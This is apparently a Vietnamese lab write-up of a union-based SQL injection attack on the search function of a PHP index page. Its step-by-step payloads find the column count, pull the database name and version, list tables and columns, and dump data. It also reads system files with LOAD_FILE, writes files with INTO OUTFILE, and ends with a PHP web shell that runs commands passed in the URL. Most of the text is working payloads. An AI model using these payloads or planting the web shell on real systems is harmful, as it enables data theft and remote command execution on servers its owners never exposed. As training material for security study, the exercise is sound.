Người thực hiện: Lê Trần Văn Chương.
Ngày: 05/04/2022.
Mục lục:
- [Khai thác SQLi Union Based chức năng search ở trang index.php](#khai-thác-sqli-union-based-chức-năng-search-ở-trang-indexphp)
- [LOAD_FILE()](#load_file)
- [OUTFILE()](#outfile)
- [<?include($_GET['cmd']); ?>](#include_getcmd-)
## Khai thác SQLi Union Based chức năng search ở trang index.php
1. Kiểm tra xem có tổng cộng bao nhiêu cột dữ liệu trong bảng của DB.
`' ORDER BY 14 #` 
	
2. Vị trí của từng cột dữ liệu trong bảng hiện ở ngoài client (1, 12, 2, 10, 11)
`' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 #`
![Hinh 1.](~/../img/1.png)

3. Kiểm tra kiểu dữ liệu của từng cột hiện ở ngoài client (1)
`' UNION SELECT 'a',NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #` 
![Hinh 2.](~/../img/2.png)

4. Kiểm tra kiểu dữ liệu của từng cột hiện ở ngoài client (2)
`' UNION SELECT 'a','a',3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
![Hinh 3.](~/../img/3.png)

5. Kiểm tra kiểu dữ liệu của từng cột hiện ở ngoài client (10)
`' UNION SELECT 'a','a',3,4,5,6,7,8,9,'a',NULL,NULL,13,14 #` 
![Hinh 4.](~/../img/4.png)

6. Kiểm tra kiểu dữ liệu của từng cột hiện ở ngoài client (11)
`' UNION SELECT 'a','a',3,4,5,6,7,8,9,'a','a',NULL,13,14 #` 
![Hinh 5.](~/../img/5.png)

7. Kiểm tra kiểu dữ liệu của từng cột hiện ở ngoài client (12)
`' UNION SELECT 'a','a',3,4,5,6,7,8,9,'a','a','a',13,14 #` 
![Hinh 6.](~/../img/6.png)

8. Kiểm tra thử những cột vừa rồi kiểu dữ liệu có phải là string hay không
`' UNION SELECT 'asd','asd',3,4,5,6,7,8,9,'asd','asd','asd',13,14 #` 
=> Các cột hiện trên client đều có kiểu dữ liệu là string
![Hinh 7.](~/../img/7.png)

9. Kiểm tra DB hiện tại
`' UNION SELECT database(),2,3,4,5,6,7,8,9,10,11,12,13,14 #` 
![Hinh 8.](~/../img/8.png)

10.  Version của DB
`' UNION SELECT version(),2,3,4,5,6,7,8,9,10,11,12,13,14 #` 
![Hinh 9.](~/../img/9.png)

11. Lấy tất cả các table có trong DB
`' UNION SELECT  table_name,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM information_schema.tables #`
(Một số bảng đáng chú ý: `admin_func, payload, user, users, account, accounts`)
![Hinh 10.](~/../img/10.png)

12.  Lấy tất cả các trường trong bảng admin_func
`' UNION SELECT  column_name,2,3,4,5,6,7,8,9,10,11,12,13,14 FROM information_schema.columns WHERE table_name='admin_func' #`
=> từ đây có thể khai thác dữ liệu như mình muốn
![Hinh 11.](~/../img/11.png)

13.  Ví dụ: tôi khai thác cột `name` và `extension` của bảng `payload`.
`' UNION SELECT  name,extension,3,4,5,6,7,8,9,10,11,12,13,14 FROM payload  #`
![Hinh 12.](~/../img/12.png)

## LOAD_FILE()
1. Đầu tiên, xem quyền của user bằng hàm `group_concat(table_name)`
`' UNION SELECT (SELECT group_concat(user,file_priv) FROM mysql.user),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
![Hinh 13.](~/../img/13.png)

2. Kiểm tra file `tmp` đang ở đâu
`' UNION SELECT @@slave_load_tmpdir,NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #` 
=> `C:\xampp\tmp`
![Hinh 14.](~/../img/14.png)

3. File hosts
`' UNION SELECT load_file("C:/Windows/System32/Drivers/etc/hosts"),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
![Hinh 15.](~/../img/16.png)

## OUTFILE()

`' UNION SELECT NULL,NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 INTO OUTFILE "C:/Users/MTGR/Desktop/test.php" #`
![Hinh 16.](~/../img/17.png)

---php
<pre>
<?php
	system($_GET['cmd'])
?>
</pre>

<?include($_GET['cmd']); ?>
---